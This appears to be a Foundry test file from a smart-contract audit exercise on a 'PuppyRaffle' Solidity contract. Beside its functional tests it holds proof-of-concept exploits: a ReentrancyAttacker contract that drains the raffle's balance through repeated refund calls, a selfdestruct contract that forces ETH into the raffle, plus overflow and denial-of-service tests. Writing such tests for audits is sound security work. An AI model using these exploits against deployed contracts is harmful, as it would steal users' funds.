// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    /////////////////////
    /// EnterRaffle   ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    // block gas limit is 30 million on ethereum BUT in a local testing environment it is not stricly enforced for convenience.
    // So this is not a feasible way to test DoS.
    function test_denialOfService_b() public {
        uint256 playersNum = 100000;
        address[] memory players = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i + 1)); // use dummy addresses
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    }

    function test_denialOfService_a() public {
        vm.txGasPrice(1); // FOundry cheat code for setting gas price to 1 (to avoid any funny business)

        // let the first 100 players enter
        uint256 playersNum = 100;
        address[] memory players1stBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players1stBatch[i] = address(uint160(i)); // use dummy addresses
        }

        // see how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players1stBatch.length}(players1stBatch);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players is ", gasUsedFirst);

        // let the 2nd 100 players enter
        address[] memory players2ndBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players2ndBatch[i] = address(uint160(i + playersNum)); // use dummy addresses, address 100, 101...
        }

        // see how much gas it costs
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2ndBatch.length}(players2ndBatch);
        gasEnd = gasleft();
        uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the 2nd 100 players is ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function test_firstPlayerAppearsInactiveEvenIfEntered() public {
        // player 0 enters
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        // check whether active
        uint256 inactiveIndicator = 0;
        uint256 activeOrNot = puppyRaffle.getActivePlayerIndex(playerOne);

        assertEq(activeOrNot, inactiveIndicator);
    }

    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);

        address attackUser = makeAddr("attackUser");
        // deal money to the attacker so it can enter the raffle
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerBalance = address(attackerContract).balance;
        uint256 startingRaffleBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        uint256 finalAttackerBalance = address(attackerContract).balance;
        uint256 finalRaffleBalance = address(puppyRaffle).balance;

        console.log("Starting attacker contract balance: ", startingAttackerBalance);
        console.log("Starting raffle contract balance: ", startingRaffleBalance);
        console.log("Final attacker contract balance: ", finalAttackerBalance);
        console.log("Final raffle contract balance: ", finalRaffleBalance);
    }

    function test_totalFeesOverflow() public {
        // original entrance fee is 1e18
        // max value of uint64 is 18446744073709551615

        uint256 uint64MaxValue = type(uint64).max; // 18446744073709551615
        uint256 playerNumWoOverflow = uint64MaxValue / ((entranceFee * 20) / 100);
        uint256 playersNum = playerNumWoOverflow; // 92

        // create 2 batches of players
        address[] memory players1stBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players1stBatch[i] = address(uint160(i)); // use dummy addresses
        }

        playersNum = 4;
        address[] memory players2ndBatch = new address[](playersNum); // arrays declared in memory cannot change in size, size needs to be specified at declaration
        for (uint256 i = 0; i < playersNum; i++) {
            players2ndBatch[i] = address(uint160(i + playersNum)); // use dummy addresses
        }

        // let the 1st batch enter the game
        puppyRaffle.enterRaffle{value: entranceFee * players1stBatch.length}(players1stBatch);
        // advance time with 1 day so the raffle duration is over
        vm.warp(block.timestamp + duration + 1);
        // select winner (totalFees is calculated in this function, increases from raffle to raffle until withdrawn)
        puppyRaffle.selectWinner();
        // check totalFees after 1st batch
        uint64 totalFeesAfter1stBatch = puppyRaffle.totalFees();

        // let the second batch of players enter
        puppyRaffle.enterRaffle{value: entranceFee * players2ndBatch.length}(players2ndBatch);
        // advance time with 1 day so the raffle duration is over
        vm.warp(block.timestamp + duration + 1);
        // select winner (totalFees is calculated in this function, increases from raffle to raffle until withdrawn)
        puppyRaffle.selectWinner();
        // check totalFees after 1st batch
        uint64 totalFeesAfter2ndBatch = puppyRaffle.totalFees();

        console.log("Total fees after the first batch of entrants: ", totalFeesAfter1stBatch);
        console.log("Total fees after the second batch of entrants: ", totalFeesAfter2ndBatch);

        assert(totalFeesAfter2ndBatch < totalFeesAfter1stBatch);

        // We are also unable to withdraw any fees because of the require check expects a strong equality which breaks due to the overflow
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    /*function test_cannotWithdraw() public playersEntered {
        uint256 oneDay = 1 days;
        vm.warp(block.timestamp + oneDay + 1);
        puppyRaffle.selectWinner();
        console.log("Total protocol fees: ", puppyRaffle.totalFees());
        puppyRaffle.withdrawFees();
    }*/

    function test_cantSendEthToPuppyContract() public {
        address moneySender = makeAddr("sender");
        vm.deal(moneySender, 1 ether);
        vm.expectRevert();
        vm.prank(moneySender);
        (bool success,) = payable(address(puppyRaffle)).call{value: 1 ether}("");
        //require(success); is this needed?
    }

    function test_mishandlingOfEth() public playersEntered {
        // conclude the first raffle with 4 players
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();

        // check the collected protocol fees
        uint256 totalFees = puppyRaffle.totalFees();
        console.log("Protocol fees collected: ", totalFees);
        assertEq(totalFees, address(puppyRaffle).balance);

        address ethForcer = makeAddr("ethForcer"); // address which will deploy the self-destroying contract
        SelfDesctructMe selfdestructMe;
        vm.prank(ethForcer);
        selfdestructMe = new SelfDesctructMe(address(puppyRaffle)); // deploy the self-destructing contract
        vm.deal(address(selfdestructMe), 1 ether); // give 1 ETH the self-desctructing contract
        vm.prank(ethForcer);
        selfdestructMe.destroy(); // destroy and, meanwhile, force ETH to PuppyRaffle

        assert(totalFees <= address(puppyRaffle).balance);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

///////////////////////////////////////////////////////////////////////////////////
///////////////////// Reentrancy attack contract //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;

    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players); // enter
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex); // immediately refund, this refund will call back this contract, to the receive / fallback function
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex); // call this until we empty the Raffle contact's balance
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }
}

///////////////////////////////////////////////////////////////////////////////////
///////////////////// Selfdesctucting contract   //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////

contract SelfDesctructMe {
    PuppyRaffle puppyRaffle;

    address public owner;
    address public forceEthTo;

    constructor(address _forceEthTo) {
        owner = msg.sender;
        forceEthTo = _forceEthTo;
    }

    function destroy() external {
        require(msg.sender == owner, "Only the owner can destroy this contract.");
        selfdestruct(payable(forceEthTo));
    }
}
